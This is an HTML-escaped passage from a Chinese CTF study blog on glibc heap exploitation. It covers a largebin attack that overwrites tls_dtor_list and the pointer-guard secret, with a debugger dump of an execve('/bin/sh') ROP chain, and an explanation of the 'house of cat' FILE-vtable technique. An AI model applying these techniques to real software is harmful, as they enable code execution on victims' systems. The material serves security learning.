class=&#34;number&#34;&gt;0x5572d1a522a0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a522b0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a522c0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00005572d1a52770&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a522d0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00005572d1a52b90&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a522e0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a522f0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00005572d1a52fb0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52300&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00005572d1a533d0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52310&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52320&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00005572d1a537f0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52330&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00005572d1a53c10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52340&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000841&lt;/span&gt;				&lt;span class=&#34;comment&#34;&gt;//原本为0x421&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52350&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007fa2a9bbace0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007fa2a9bbace0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52360&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;重新申请第一个 chunk 区域，第二个 chunk 的数据就会被更改了。&lt;/p&gt;
&lt;p&gt;我们就完成了 libc 的泄露，下面就是堆 heap 地址的泄露，只要有了 overlap 我们就完成了两地址的泄露 ，这里不在细说。&lt;/p&gt;
&lt;p&gt;接下来就是利用 largebinattack 攻击，首先修改 tls_dtor_list 的值为一个我们可控制的 chunk 地址。然后修改 secret 为已知可控地址。secret 是 tcache,fastbin 加密 key。&lt;/p&gt;
&lt;p&gt;tls_dtor_list 结构体的为&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;*(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; dtor_list *) &lt;span class=&#34;number&#34;&gt;0x563bed37d920&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  func = &lt;span class=&#34;number&#34;&gt;0x525a0543f9580000&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  obj = &lt;span class=&#34;number&#34;&gt;0x7f16ef9363e5&lt;/span&gt; &amp;lt;iconv+&lt;span class=&#34;number&#34;&gt;197&lt;/span&gt;&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0x7f16efae4698&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  next = &lt;span class=&#34;number&#34;&gt;0x7f16ef937e51&lt;/span&gt; &amp;lt;__gconv_close_transform+&lt;span class=&#34;number&#34;&gt;225&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+++++++++++++++++++++++&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; tel &lt;span class=&#34;number&#34;&gt;0x563bed37d920&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d920&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x525a0543f9580000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0008&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d928&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f16ef9363e5&lt;/span&gt; (iconv+&lt;span class=&#34;number&#34;&gt;197&lt;/span&gt;) ◂— pop    rdi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;02&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0010&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d930&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f16efae4698&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x68732f6e69622f&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;/bin/sh&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;03&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d938&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f16ef937e51&lt;/span&gt; (__gconv_close_transform+&lt;span class=&#34;number&#34;&gt;225&lt;/span&gt;) ◂— pop    rsi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;04&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0020&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d940&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0028&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d948&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f16efa2b497&lt;/span&gt; (qecvt+&lt;span class=&#34;number&#34;&gt;39&lt;/span&gt;) ◂— pop    rdx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;06&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0030&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d950&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;07&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0038&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d958&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0040&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d960&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f16ef9f70f0&lt;/span&gt; (execve) ◂— endbr64&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;总结下，这里。00 的位置，其实是任意代码执行的，除了可以写 leave，但是貌似这里的写法已经很直接，所以我们无需再更改，如有需要可以写为 orw.secret 其实是否需要改写，是根据是否可以泄露出 secret 而定，如果可以，就不需要改写，一些攻击即可。&lt;/p&gt;
&lt;p&gt;我们修改 tls_dtor_list 为一个堆头地址，我们还要将这个头部改写，因为任意代码执行就是这个直接地址开始的。&lt;/p&gt;
&lt;p&gt;关于 largebinattack，如果 bin 只有一个 free_chunk，我们攻击的话，只需要修改其 bk_nextsize。&lt;/p&gt;
&lt;p&gt;同时，我们也可以进行多次攻击，只要是 size 比第一个小，就会进行前插，但是这次不是修改第一个头的 bk_next, 而是第一次那个。就是说在同一个位置修改，其他尽量保持不变。&lt;/p&gt;
&lt;p&gt;关键就在与修改 tls_dtor_list，开始这里是空的，将其指向一个 chunk, 并且完全控制这里，在这里构造一个 leave ret 加上 rop，注意的是 leaveret 的地址要进行加密。&lt;/p&gt;
&lt;h2 id=&#34;house-of-cat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#house-of-cat&#34;&gt;#&lt;/a&gt; house of cat&lt;/h2&gt;
&lt;p&gt;这是一个比较新的路径，是 catF1y 师傅挖出来的一条链子，并且在强网杯初赛部署了同名题目。但是，就在比赛前夕，以为师傅连更两条博客，house of apple2 以及 house of apple3，导致了题目被非预期。同时，我们也尝试了使用 house of emma，成功非预期。这里就先开始预期解的 house of cat 的学习记录。&lt;/p&gt;
&lt;p&gt;高版本的 glibc 就是对 io 的疯狂脑洞输出。house of cat 也是一个有关 io 的利用路径。&lt;/p&gt;
&lt;h3 id=&#34;利用条件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用条件&#34;&gt;#&lt;/a&gt; 利用条件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;1. 能够任意地址写一个可控堆地址。&lt;/li&gt;
&lt;li&gt;2. 能够泄露堆地址和 libc 基址。&lt;/li&gt;
&lt;li&gt;3. 能够触发 IO 流（FSOP 或触发__malloc_assert），执行 IO 相关函数。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其实从这里我们看出，这里的利用条件与其他的一些手法极为相似，基本就是利用 exit () 函数退出的一些操作。随着版本的迭代，glibc 对于虚表的保护也是不断的更新，首先就是对于 io_file_jump 的检查，包括但不限于禁止直接修改虚表内容、检查虚表地址是否合法（在规定的虚表地址范围内）。其实之前我们讲过利用 io_str_jump 的虚表绕过检查，但是当时的方法的弊端就是两个函数_IO_str_overflow 以及_IO_str_finish 的相关漏洞被封死。&lt;/p&gt;
&lt;p&gt;这里作者利用了一个新的 io 虚表结构体_IO_wfile_jumps，然后下面的操作与_IO_str_jumps 非常相似，甚至函数名字都很相似&lt;/p&gt;
&lt;p&gt;这里我先介绍下目标函数是如何实现然亦函数调用的，&lt;/p&gt;
&lt;p&gt;结构体&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_jump_t&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_wfile_jumps&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;libio_vtable&lt;/span&gt; =&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT_DUMMY,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(finish, _IO_new_file_finish),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(xsputn, _IO_wfile_xsputn),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(xsgetn, _IO_file_xsgetn),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(seekoff, _IO_wfile_seekoff),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(seekpos, _IO_default_seekpos),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(setbuf, _IO_new_file_setbuf),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(doallocate, _IO_wfile_doallocate),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(read, _IO_file_read),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(write, _IO_new_file_write),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(seek, _IO_file_seek),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(close, _IO_file_close),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(stat, _IO_file_stat),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(showmanyc, _IO_default_showmanyc),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(imbue, _IO_default_imbue)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;原理，利用程序报错__malloc_asset 报错调用 xsputn, 替换该虚表函数为 _IO_wfile_seekfoff&lt;/p&gt;
&lt;p&gt;FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。&lt;/p&gt;
&lt;p&gt;其中的函数（_IO_wfile_seekoff）的内部结构为&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;off64_t&lt;/span&gt; _IO_wfile_seekoff (FILE *fp, &lt;span class=&#34;type&#34;&gt;off64_t&lt;/span&gt; offset, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; dir, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; mode)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;off64_t&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;off64_t&lt;/span&gt; delta, new_offset;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (mode == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; do_ftell_wide (fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; must_be_exact = ((fp-&amp;gt;_wide_data-&amp;gt;_IO_read_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            == fp-&amp;gt;_wide_data-&amp;gt;_IO_read_end)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;amp;&amp;amp; (fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               == fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#需要绕过was_writing的检测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; was_writing = ((fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;gt; fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              || _IO_in_put_mode (fp));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (was_writing &amp;amp;&amp;amp; _IO_switch_to_wget_mode (fp))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; WEOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果 mode!=0 且 fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base 会调用_IO_switch_to_wget_mode 这个函数，继续跟进代码。虽然说这里要求的是 mode 值不为零，但是在最开始伪造的时候，mode 设置却还是 0，不过调试的时候，发现这里可能会发生变化，从我们传入的 0 变为了 - 1。经过测试，最开始也可以将 mode 设置为 1 ，后面触发__malloc_assert,mode 不会被更改。（这条仅在 house of cat 同名题目测试）。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; _IO_switch_to_wget_mode (FILE *fp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;wint_t&lt;/span&gt;)_IO_WOVERFLOW (fp, WEOF) == WEOF)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;而_IO_WOVERFLOW 是 glibc 里定义的一个宏调用函数&lt;/p&gt;
